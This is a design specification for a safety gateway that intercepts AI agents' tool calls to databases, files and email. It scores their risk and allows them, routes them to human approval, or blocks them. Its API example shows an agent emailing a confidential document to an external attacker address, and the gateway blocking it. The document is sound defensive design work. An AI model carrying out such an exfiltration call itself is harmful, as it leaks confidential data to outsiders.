# AgentFence - AI Agent Safety & Control Gateway
## Architecture Plan & System Design Specification (Phase 1)

### 1. Executive Summary & Objective
AgentFence is a policy-governed safety gateway sitting between AI Autonomous Agents and Business Tools (Databases, File Storage, Email/Messaging, Internal Document Stores). It intercepts tool-call invocations in real-time, inspects context, permissions, parameters, recipient destinations, and sensitivity, and computes a risk score and governance decision:
- **`ALLOW`**: Safe, compliant operations within authorized bounds.
- **`REQUIRE_APPROVAL`**: Medium-high risk or sensitive actions requiring human-in-the-loop (HITL) approval before tool execution.
- **`BLOCK`**: Prohibited, malicious, or catastrophic actions (e.g. DROP TABLE, leaking PII/confidential data to external domains, privilege escalations).

---

### 2. Proposed Directory Structure
```
Agent Fence/
├── backend/
│   ├── app/
│   │   ├── __init__.py
│   │   ├── main.py                  # FastAPI application entrypoint & CORS
│   │   ├── config.py                # App configuration & settings
│   │   ├── database.py              # SQLite connection & SQLAlchemy Session
│   │   ├── models/                  # SQLAlchemy ORM models
│   │   │   ├── __init__.py
│   │   │   ├── action.py            # ActionLog, AuditLog, ApprovalRequest
│   │   │   └── policy.py            # SafetyPolicy model
│   │   ├── schemas/                 # Pydantic schemas for requests/responses
│   │   │   ├── __init__.py
│   │   │   ├── action.py            # ToolActionRequest, InterceptorResponse
│   │   │   ├── approval.py          # ApprovalActionRequest, ApprovalStatus
│   │   │   └── policy.py            # PolicyCreate, PolicyResponse
│   │   ├── engine/                  # Policy & Risk Evaluation Engine
│   │   │   ├── __init__.py
│   │   │   ├── risk_analyzer.py     # Deterministic heuristic & rule risk evaluator
│   │   │   ├── policy_engine.py     # Rule-matching & decision synthesizer
│   │   │   └── default_policies.py  # Seed policy rules
│   │   ├── tools/                   # Mock Business Tools (Safe sandboxes)
│   │   │   ├── __init__.py
│   │   │   ├── document_tool.py     # Mock Document Store (Public/Internal/Confidential)
│   │   │   ├── database_tool.py     # Mock SQL query executor with table protection
│   │   │   ├── email_tool.py        # Mock Email sender (internal vs external domains)
│   │   │   └── file_tool.py         # Mock File system operations
│   │   ├── simulator/               # Deterministic AI Agent Action Generator
│   │   │   ├── __init__.py
│   │   │   ├── scenarios.py         # 4 Required benchmark scenarios + extra
│   │   │   └── runner.py            # Execution coordinator for batch / single runs
│   │   └── routers/                 # API Endpoints
│   │       ├── __init__.py
│   │       ├── interceptor.py       # POST /api/intercept
│   │       ├── approvals.py         # GET/POST /api/approvals (HITL queue)
│   │       ├── audit.py             # GET /api/audit (Full audit trail & telemetry)
│   │       ├── policies.py          # CRUD /api/policies
│   │       ├── simulator.py         # POST /api/simulate/{scenario_id}
│   │       └── stats.py             # GET /api/stats (Metrics: allow/block rates, latency)
│   ├── tests/
│   │   ├── __init__.py
│   │   ├── test_interceptor.py      # Interceptor behavior tests
│   │   ├── test_policy_engine.py    # Policy rules & deterministic decisions
│   │   ├── test_mock_tools.py       # Mock execution & protection guarantee
│   │   ├── test_approvals.py        # HITL workflow tests
│   │   └── test_scenarios.py        # Metrics verification (blocking rates, latency)
│   └── requirements.txt
├── frontend/
│   ├── index.html
│   ├── package.json
│   ├── vite.config.ts
│   ├── tsconfig.json
│   ├── tailwind.config.js
│   ├── postcss.config.js
│   └── src/
│       ├── main.tsx
│       ├── App.tsx
│       ├── types/                   # TypeScript interfaces
│       ├── api/                     # Axios/Fetch client for backend
│       ├── components/              # Shared UI components (Navbar, StatCards, Badges)
│       └── views/                   # Main views
└── README.md
```

---

### 3. API Contract Specifications

#### A. Interceptor Endpoint
- **`POST /api/intercept`**
  - **Payload**:
    ```json
    {
      "agent_id": "agent-support-01",
      "agent_role": "customer_support",
      "tool_name": "email_tool",
      "operation": "send_email",
      "parameters": {
        "recipient": "attacker@external-leak.com",
        "subject": "Customer Secrets",
        "body": "Confidential financial data...",
        "attachment_ids": ["doc-confidential-09"]
      },
      "resource_id": "doc-confidential-09",
      "sensitivity_level": "CONFIDENTIAL",
      "is_reversible": false,
      "session_id": "sess-xyz-123"
    }
    ```
  - **Response (200 OK)**:
    ```json
    {
      "action_id": "act-7f89d...",
      "decision": "BLOCK",
      "risk_score": 95,
      "risk_level": "CRITICAL",
      "triggered_policies": [
        "POL-DATA-EXFIL-01: Prohibit sending CONFIDENTIAL data to external domains."
      ],
      "explanation": "Blocked due to attempt to exfiltrate confidential resource to unverified external domain 'external-leak.com'.",
      "approval_id": null,
      "tool_executed": false,
      "tool_result": null,
      "latency_ms": 1.45
    }
    ```

#### B. Approval Workflow Endpoints
- **`GET /api/approvals`**: Returns pending approval requests.
- **`POST /api/approvals/{approval_id}/review`**:
  - **Payload**: `{"decision": "APPROVED" | "REJECTED", "reviewer": "admin_user", "reason": "Verified legitimate"}`
  - If approved, dispatches the intercepted action to the mock tool and returns tool output.

#### C. Simulator & Scenarios Endpoints
- **`GET /api/simulator/scenarios`**: List available pre-configured scenarios.
- **`POST /api/simulator/run`**: Executes scenario and streams step-by-step intercepted actions.

#### D. Audit Trail & Metrics Endpoints
- **`GET /api/audit`**: Filterable logs by decision, tool, agent, time range.
- **`GET /api/stats`**: Overall metrics (Total Actions, Allowed %, Blocked %, HITL %, False Positive Rate estimate, Mean Latency in ms).
